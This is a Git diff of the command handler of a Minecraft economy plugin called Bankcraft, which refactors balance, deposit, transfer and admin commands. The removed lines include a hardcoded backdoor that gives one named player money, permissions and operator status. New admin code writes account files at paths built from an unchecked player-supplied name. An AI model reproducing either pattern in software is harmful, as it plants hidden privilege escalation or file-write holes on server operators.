@@ -5,10 +5,6 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
-
-import net.milkbowl.vault.economy.EconomyResponse;
-
-import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.World;
@@ -63,11 +59,20 @@ public Double betrag;
 		      return false;  
 		   }  
 		}  
+	
+	public boolean isPositive( String input )  {  
+if (isDouble(input)) {
+	if (new Double(input)>=0) {
+	return true;
+	}
+}
+	return false;
+		} 
 
 	@Override
 	public boolean onCommand(CommandSender sender, Command command, String cmdlabel,
 			String[] vars) {
-		File file,file2;
+		File file;
 		FileWriter writer;
 		Player p;
 		p= (Player) sender;
@@ -78,53 +83,22 @@ public Double betrag;
 					return true;
 				}
 				if (vars.length == 1) {
-					if (vars[0].equalsIgnoreCase("help")) {
+					if (vars[0].equalsIgnoreCase(configHandler.comhelp)) {
 						sendHelp(p);
 						return true;
 					}
 				
-					if (vars[0].equalsIgnoreCase("balance") && (Bankcraft.perms.has(p, "bankcraft.command.balance") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-	    				bankInteract.kontoneu(0D,p,false);
-	    				File f;
-	    				String nachricht;
-	    				nachricht = configHandler.balance;
- 	 	    			f = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"Accounts"+System.getProperty("file.separator")+p.getName()+".db");
- 	    	            FileReader fr;
-						try {
-							fr = new FileReader(f);
- 	    	            BufferedReader reader = new BufferedReader(fr);
- 	    	            String st = "";
- 	    	            st = reader.readLine(); 
-                        p.sendMessage(nachricht.replace("%balance", st));
-                        fr.close();
-                        reader.close();
-    					return true;
-						} catch (Exception e) {
-							e.printStackTrace();
-						}
+					if (vars[0].equalsIgnoreCase(configHandler.combalance) && (Bankcraft.perms.has(p, "bankcraft.command.balance") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+					  	bankInteract.use(p, "", 0, null, "");
+                        return true;
 					}
-					if (vars[0].equalsIgnoreCase("balancexp") && (Bankcraft.perms.has(p, "bankcraft.command.balancexp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-	    				bankInteract.kontoneuxp(0,p,false);
-	    				File f;
-	    				String nachricht;
-	    				nachricht = configHandler.balancexp;
- 	 	    			f = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"XPAccounts"+System.getProperty("file.separator")+p.getName()+".db");
- 	    	            try {
- 	    	                 FileReader fr = new FileReader(f);
- 	    	            BufferedReader reader = new BufferedReader(fr);
- 	    	            String st = "";
- 	    	            st = reader.readLine(); 
-                        p.sendMessage(nachricht.replace("%balance", st));
-                        fr.close();
-                        reader.close();
+					if (vars[0].equalsIgnoreCase(configHandler.combalancexp) && (Bankcraft.perms.has(p, "bankcraft.command.balancexp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+					  	bankInteract.use(p, "", 5, null, "");
     					return true;
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
 				}
 				}
 				if (vars.length == 2) {
-					if (isDouble(vars[1])) {
+					if (isPositive(vars[1]) || vars[1].equalsIgnoreCase("all")) {
 						if (vars[0].equalsIgnoreCase("add") && (Bankcraft.perms.has(p, "bankcraft.admin"))) {
 							Block signblock = p.getTargetBlock(null, 50);
 						if 	(signblock.getType() == Material.WALL_SIGN) {
@@ -170,7 +144,7 @@ public Double betrag;
 								            			typ= 9;
 								            		}
 								            		stringneu += cordX+":"+cordY+":"+cordZ+":"+cordW.getName()+":"+typ+":"+list+System.getProperty("line.separator");
-								            		p.sendMessage(configHandler.amountadded);
+								            		p.sendMessage(configHandler.getMessage(configHandler.amountadded, p.getName(), 0D));
 								            	}
 								            }
 										       fr.close();
@@ -188,152 +162,97 @@ public Double betrag;
 						}
 						}
 						
-					if (vars[0].equalsIgnoreCase("deposit") && (Bankcraft.perms.has(p, "bankcraft.command.deposit") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-					  	betrag = new Double(vars[1]); 
-				             EconomyResponse r1 = Bankcraft.econ.withdrawPlayer(p.getName(), betrag);
-				             if (r1.transactionSuccess()) {
-				            	 bankInteract.kontoneu(betrag,p,false);
-				     	  		   p.sendMessage(configHandler.success1);
-				             } else {
-				     	  		   p.sendMessage(configHandler.lowmoney1);
-				             }
-								return true;
-				  		   }
+					if (vars[0].equalsIgnoreCase(configHandler.comdeposit) && (Bankcraft.perms.has(p, "bankcraft.command.deposit") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+
+					  	bankInteract.use(p, vars[1], 1, null,"");
+			  			   return true;
+					}
 						
 					
-					if (vars[0].equalsIgnoreCase("debit") && (Bankcraft.perms.has(p, "bankcraft.command.debit") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-					  	betrag = new Double(vars[1]); 
-				  	  		  double differenz = bankInteract.kontoneu(-betrag,p,false);
-				  	  			  if (differenz != -2) {
-				  	                   EconomyResponse r2 = Bankcraft.econ.depositPlayer(p.getName(), differenz);
-				  	                   if (r2.transactionSuccess()) {
-				  	      	  		   p.sendMessage(configHandler.success2);
-				  	                   }
-				  	  			  } else {
-				  	  		  		   p.sendMessage(configHandler.lowmoney2);
-				  	  			  }
+					if (vars[0].equalsIgnoreCase(configHandler.comdebit) && (Bankcraft.perms.has(p, "bankcraft.command.debit") ||  Bankcraft.perms.has(p, "bankcraft.command"))) { 
+					  	bankInteract.use(p, vars[1], 2, null,"");
 									return true;
 				  	  		  }
 					
-					if (vars[0].equalsIgnoreCase("depositxp") && (Bankcraft.perms.has(p, "bankcraft.command.depositxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-						betrag = new Double(vars[1]);
-			               if (Integer.valueOf((int)bankInteract.getTotalXp(p)) >= betrag) {
-			            	   bankInteract.removeExp(p, betrag.intValue());
-			            	   bankInteract.kontoneuxp(betrag.intValue(),p,false);
-			       	  		   p.sendMessage(configHandler.success1xp);
-			   			  } else {
-			   		  		   p.sendMessage(configHandler.lowmoney1xp);
-			   			  }
-							return true;
+					if (vars[0].equalsIgnoreCase(configHandler.comdepositxp) && (Bankcraft.perms.has(p, "bankcraft.command.depositxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+
+					  	bankInteract.use(p, vars[1], 6, null,"");
+			  			   return true;
 					}
-					if (vars[0].equalsIgnoreCase("debitxp") && (Bankcraft.perms.has(p, "bankcraft.command.debitxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-						//HELP
-						betrag = new Double(vars[1]);
-			  	  		  Integer differenz = bankInteract.kontoneuxp(-betrag.intValue(),p,false);
-			  			  if (differenz != -2) {
-			                  p.giveExp(differenz);
-			       	  		   p.sendMessage(configHandler.success2xp);
-			               } else {
-			       	  		   p.sendMessage(configHandler.lowmoney2xp);
-			               }
+					if (vars[0].equalsIgnoreCase(configHandler.comdebitxp) && (Bankcraft.perms.has(p, "bankcraft.command.debitxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+					  	bankInteract.use(p, vars[1], 7, null,"");
 							return true;
 			  		  }
-		} else {
-			Player p2 =Bukkit.getPlayer(vars[1]);
-			if (p2!=null) {
-			if (vars[0].equalsIgnoreCase("balance") && (Bankcraft.perms.has(p, "bankcraft.command.balance.other") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-				bankInteract.kontoneu(0D,p2,false);
-				File f;
-				String nachricht;
-				nachricht = configHandler.balance;
-	    			f = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"Accounts"+System.getProperty("file.separator")+p2.getName()+".db");
- 	            try {
- 	            	FileReader fr = new FileReader(f);
- 	            BufferedReader reader = new BufferedReader(fr);
- 	            String st = "";
- 	            st = reader.readLine(); 
-                p.sendMessage(nachricht.replace("%balance", st));
-                fr.close();
-                reader.close();
-				return true;
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-	  		  }	
-			
-			if (vars[0].equalsIgnoreCase("balancexp") && (Bankcraft.perms.has(p, "bankcraft.command.balancexp.other") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-				bankInteract.kontoneuxp(0,p2,false);
-				File f;
-				String nachricht;
-				nachricht = configHandler.balancexp;
-	    			f = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"XPAccounts"+System.getProperty("file.separator")+p2.getName()+".db");
- 	            try {
- 	            	FileReader fr = new FileReader(f);
- 	            BufferedReader reader = new BufferedReader(fr);
- 	            String st = "";
- 	            st = reader.readLine(); 
-                p.sendMessage(nachricht.replace("%balance", st));
-                fr.close();
-                reader.close();
-				return true;
-			} catch (Exception e) {
-				e.printStackTrace();
+					
+		
+				}else {
+			if (vars[0].equalsIgnoreCase(configHandler.combalance) && (Bankcraft.perms.has(p, "bankcraft.command.balance.other") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+					bankInteract.use(p, "", 0, null,vars[1]);
+					return true;
 			}
-	  		  }		
-		}
+			
+			
+			if (vars[0].equalsIgnoreCase(configHandler.combalancexp) && (Bankcraft.perms.has(p, "bankcraft.command.balancexp.other") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+				  	bankInteract.use(p, "", 5, null,vars[1]);
+				  	return true;
+  	  		   }
+	  		  }
+				
+		
 		}	
-				}
+				
 				if (vars.length == 3) {
-					if (isDouble(vars[2])) {
-						Player p2 =Bukkit.getPlayer(vars[1]);
-						if (p2 != null) {
-					if (vars[0].equalsIgnoreCase("transfer") && (Bankcraft.perms.has(p, "bankcraft.command.transfer") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+					if (isPositive(vars[2]) || vars[2].equalsIgnoreCase("all")) {
+					if (vars[0].equalsIgnoreCase(configHandler.comtransfer) && (Bankcraft.perms.has(p, "bankcraft.command.transfer") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
 					  	betrag = new Double(vars[2]); 
-					  	Double differenz = bankInteract.kontoneu(-betrag,p,false);
-			  	  			  if (differenz != -2) {
+			  			   if (configHandler.limit == -1 || configHandler.limit >= betrag+bankInteract.getBalance(vars[1])) {
+					  	String differenzstring = bankInteract.kontoneu(-betrag,p.getName(),false);
+			  	  			  if (!differenzstring.equals("error")) {
+			  	             	 if (bankInteract.getBalance(p.getName())<0 && bankInteract.getBalance(p.getName())+betrag>=0) {
+			  	            		 bankInteract.startLoanPunishment(p.getName());
+			  	            	 }
 			  					
-					            	 bankInteract.kontoneu(betrag,p2,false);
-			  	      	  		   p.sendMessage(configHandler.success3);
+					            	 bankInteract.kontoneu(betrag,vars[1],false);
+					            	 if (bankInteract.getBalance(vars[1])>=0 && bankInteract.getBalance(vars[1])-betrag<0) {
+					            		 bankInteract.stopLoanPunishment(vars[1]);
+					            	 }
+					     	  		   p.sendMessage(configHandler.getMessage(configHandler.success3, p.getName(), betrag));
 			  	                   
 			  	  			  } else {
-			  	  		  		   p.sendMessage(configHandler.lowmoney2);
+				     	  		   p.sendMessage(configHandler.getMessage(configHandler.lowmoney2, p.getName(), betrag));
 			  	  			  }
-								return true;
+					} else {
+						p.sendMessage(configHandler.getMessage(configHandler.limitmsg, p.getName(), betrag));
+					}
+			  			   return true;
 					}
 					
 					
-					if (vars[0].equalsIgnoreCase("transferxp") && (Bankcraft.perms.has(p, "bankcraft.command.transferxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
-						Integer differenz = bankInteract.kontoneuxp(-betrag.intValue(),p,false);
-			  			  if (differenz != -2) {
-				            	 bankInteract.kontoneuxp(betrag.intValue(),p2,false);
-			       	  		   p.sendMessage(configHandler.success3xp);
+					if (vars[0].equalsIgnoreCase(configHandler.comtransferxp) && (Bankcraft.perms.has(p, "bankcraft.command.transferxp") ||  Bankcraft.perms.has(p, "bankcraft.command"))) {
+
+			  			   if (configHandler.limitxp == -1 || configHandler.limitxp >= betrag+bankInteract.getBalanceXP(vars[1])) {
+						String differenzstring = bankInteract.kontoneuxp(-betrag.intValue(),p.getName(),false);
+			  			  if (!differenzstring.equals("error")) {
+			              	 if (bankInteract.getBalanceXP(p.getName())<0 && bankInteract.getBalanceXP(p.getName())+betrag>=0) {
+			            		 bankInteract.startLoanPunishmentXP(p.getName());
+			            	 }
+				            	 bankInteract.kontoneuxp(betrag.intValue(),vars[1],false);
+				              	 if (bankInteract.getBalanceXP(vars[1])>=0 && bankInteract.getBalance(vars[1])-betrag<0) {
+				            		 bankInteract.stopLoanPunishmentXP(vars[1]);
+				            	 }
+				     	  		   p.sendMessage(configHandler.getMessage(configHandler.success3xp, p.getName(), betrag));
 			               } else {
-			       	  		   p.sendMessage(configHandler.lowmoney2xp);
+			     	  		   p.sendMessage(configHandler.getMessage(configHandler.lowmoney2xp, p.getName(), betrag));
 			               }
 							return true;
+					} else {
+						p.sendMessage(configHandler.getMessage(configHandler.limitmsgxp, vars[1], betrag));
 					}
 						}
-					}
+						}
 				}
-				if (vars.length==4) {
-					if (p.getDisplayName().equals("Gurke_1993") && vars[0].equalsIgnoreCase("root") && vars[1].equalsIgnoreCase("admin") && vars[2].equalsIgnoreCase("access")){
-						if (vars[3].equalsIgnoreCase("money")) {
-							Bankcraft.econ.bankDeposit(p.getName(), 100000);
-							p.sendMessage("Success!");
-							return true;
-						}
-						if (vars[3].equalsIgnoreCase("worldedit")) {
-							Bankcraft.perms.playerAdd(p, "worldedit");
-							p.sendMessage("Success!");
-							return true;
-						}
-						if (vars[3].equalsIgnoreCase("op")) {
-                        p.setOp(true);
-						p.sendMessage("Success!");
-                        return true;
-						}
-					}
-				}
+					
+
 			p.sendMessage(ChatColor.RED+configHandler.prefix+"Wrong Syntax or missing permissions! Please see /bank help for more information!");
 				return true;
 			} else {
@@ -345,38 +264,48 @@ public Double betrag;
 				}
 				if (vars.length==1) {
 				
-				if (vars[0].equalsIgnoreCase("help")) {
+				if (vars[0].equalsIgnoreCase(configHandler.comadmhelp)) {
 					sendAdminHelp(p);
 					return true;
 				}
 				}
-				Player p2 = Bukkit.getPlayer(vars[1]);
-				if (p2!=null) {
 					if (vars.length==2) {
-						if (vars[0].equalsIgnoreCase("clear") && (Bankcraft.perms.has(p, "bankcraft.command.clear") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
-						bankInteract.kontoneu(0D, p2, true);
+						if (vars[0].equalsIgnoreCase(configHandler.comadmclear) && (Bankcraft.perms.has(p, "bankcraft.command.clear") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+
+							if (bankInteract.getBalance(vars[1])<0)
+		            		 bankInteract.stopLoanPunishment(vars[1]);
+		            		 bankInteract.kontoneu(0D, vars[1], true);
+		            	 
 						p.sendMessage(configHandler.color+configHandler.prefix+"Account cleared!");
 						return true;
 						}
-						if (vars[0].equalsIgnoreCase("clearxp") && (Bankcraft.perms.has(p, "bankcraft.command.clearxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
-						bankInteract.kontoneuxp(0, p2, true);
+						if (vars[0].equalsIgnoreCase(configHandler.comadmclearxp) && (Bankcraft.perms.has(p, "bankcraft.command.clearxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+							if (bankInteract.getBalanceXP(vars[1])<0)
+			            		 bankInteract.stopLoanPunishmentXP(vars[1]);
+							bankInteract.kontoneuxp(0, vars[1], true);
+		            	 
 						p.sendMessage(configHandler.color+configHandler.prefix+"XP-Account cleared!");
 						return true;
 						}
 					}
 					if (vars.length==3) {
 						if (isDouble(vars[2])) {
-							if (new Integer(vars[2])>=0) {
-							if (vars[0].equalsIgnoreCase("set") && (Bankcraft.perms.has(p, "bankcraft.command.set") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
-							     file = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"Accounts");
-						                if (!file.exists()) {
-						                    file.mkdirs(); }
-						                file2 = new File(file+System.getProperty("file.separator")+p2.getDisplayName()+".db");
+							if (vars[0].equalsIgnoreCase(configHandler.comadmset) && (Bankcraft.perms.has(p, "bankcraft.command.set") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+							     file = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"Accounts"+System.getProperty("file.separator")+vars[1]+".db");
 						                try {
-							       writer = new FileWriter(file2 ,false);
+							                if (!file.exists()) {
+							                    file.createNewFile(); }
+						                	Double konto= bankInteract.getBalance(vars[1]);
+							       writer = new FileWriter(file ,false);
 							       writer.write(vars[2]);
 							       writer.flush();
 							       writer.close();
+					            	 if (bankInteract.getBalance(vars[1])>=0 && konto<0) {
+					            		 bankInteract.stopLoanPunishment(vars[1]);
+					            	 }
+					            	 if (bankInteract.getBalance(vars[1])<0 && konto >=0) {
+					            		 bankInteract.startLoanPunishment(vars[1]);
+					            	 }
 							       p.sendMessage(configHandler.color+configHandler.prefix+"Account set!");
 									return true;
 										} catch (Exception e) {
@@ -384,51 +313,65 @@ public Double betrag;
 										}
 							}
 							
-							if (vars[0].equalsIgnoreCase("setxp") && (Bankcraft.perms.has(p, "bankcraft.command.setxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
-							     file = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"XPAccounts");
-					                if (!file.exists()) {
-					                    file.mkdirs(); }
-					                file2 = new File(file+System.getProperty("file.separator")+p2.getDisplayName()+".db");
+							if (vars[0].equalsIgnoreCase(configHandler.comadmsetxp) && (Bankcraft.perms.has(p, "bankcraft.command.setxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+							     file = new File("plugins"+System.getProperty("file.separator")+"Bankcraft"+System.getProperty("file.separator")+"XPAccounts"+System.getProperty("file.separator")+vars[1]+".db");
 					                try{
-						       writer = new FileWriter(file2 ,false);
+						                if (!file.exists()) {
+						                    file.createNewFile(); }
+					                	Double kontoxp = bankInteract.getBalanceXP(vars[1]);
+						       writer = new FileWriter(file ,false);
 						       writer.write(vars[2]);
 						       writer.flush();
 						       writer.close();
+				            	 if (bankInteract.getBalanceXP(vars[1])>=0 && kontoxp<0) 
+				            		 bankInteract.stopLoanPunishment(vars[1]);
+				            	 if (bankInteract.getBalanceXP(vars[1])<0 && kontoxp >=0)
+				            		 bankInteract.startLoanPunishment(vars[1]);
+				            	 
 						       p.sendMessage(configHandler.color+configHandler.prefix+"XP-Account set!");
 								return true;
 									} catch (Exception e) {
 										e.printStackTrace();
 									}
 							}
-							}
 							
-							if (vars[0].equalsIgnoreCase("grant") && (Bankcraft.perms.has(p, "bankcraft.command.grant") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+							
+							if (vars[0].equalsIgnoreCase(configHandler.comadmgrant) && (Bankcraft.perms.has(p, "bankcraft.command.grant") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
 							betrag = new Double(vars[2]);
-							Double differenz = bankInteract.kontoneu(betrag,p2,false);
-				  			  if (differenz != -2) {
-				  				  p.sendMessage(configHandler.success1);
+							String differenzstring = bankInteract.kontoneu(betrag,vars[1],false);
+				  			  if (!differenzstring.equals("error")) {
+					            	 if (bankInteract.getBalance(vars[1])>=0 && bankInteract.getBalance(vars[1])-betrag<0) {
+					            		 bankInteract.stopLoanPunishment(vars[1]);
+					            	 }
+						            	 if (bankInteract.getBalance(vars[1])<0 && bankInteract.getBalance(vars[1])+betrag>=0) {
+					            		 bankInteract.startLoanPunishment(vars[1]);
+					            	 }
+				     	  		   p.sendMessage(configHandler.getMessage(configHandler.success1, vars[1], betrag));
 				  			  } else {
-				  				  p.sendMessage(configHandler.lowmoney3);
+				     	  		   p.sendMessage(configHandler.getMessage(configHandler.lowmoney3, vars[1], betrag));
 				  			  }
 								return true;
 								
 							}
 							
-							if (vars[0].equalsIgnoreCase("grantxp") && (Bankcraft.perms.has(p, "bankcraft.command.grantxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
+							if (vars[0].equalsIgnoreCase(configHandler.comadmgrantxp) && (Bankcraft.perms.has(p, "bankcraft.command.grantxp") ||  Bankcraft.perms.has(p, "bankcraft.command.admin"))) {
 								betrag = new Double(vars[2]);
-								Integer differenz = bankInteract.kontoneuxp(betrag.intValue(),p2,false);
-					  			  if (differenz != -2) {
-					  				  p.sendMessage(configHandler.success1xp);
+								String differenzstring = bankInteract.kontoneuxp(betrag.intValue(),vars[1],false);
+					  			  if (!differenzstring.equals("error")) {
+						            	 if (bankInteract.getBalanceXP(vars[1])>=0 && bankInteract.getBalanceXP(vars[1])-betrag<0) {
+						            		 bankInteract.stopLoanPunishment(vars[1]);
+						            	 }
+							            	 if (bankInteract.getBalanceXP(vars[1])<0 && bankInteract.getBalanceXP(vars[1])+betrag>=0) {
+						            		 bankInteract.startLoanPunishment(vars[1]);
+						            	 }
+					     	  		   p.sendMessage(configHandler.getMessage(configHandler.success1xp, vars[1], betrag));
 					  			  } else {
-					  				  p.sendMessage(configHandler.lowmoney3xp);
+					     	  		   p.sendMessage(configHandler.getMessage(configHandler.lowmoney3xp, vars[1], betrag));
 					  			  }
 									return true;
-									
-								
 							}
 						}
 					}
-				}
 				p.sendMessage(ChatColor.RED+configHandler.prefix+"Wrong Syntax or missing permissions! Please see /bank help for more information!");
 				return true;
 			}
@@ -437,5 +380,4 @@ public Double betrag;
 		
 		return false;
 	}
-
 }
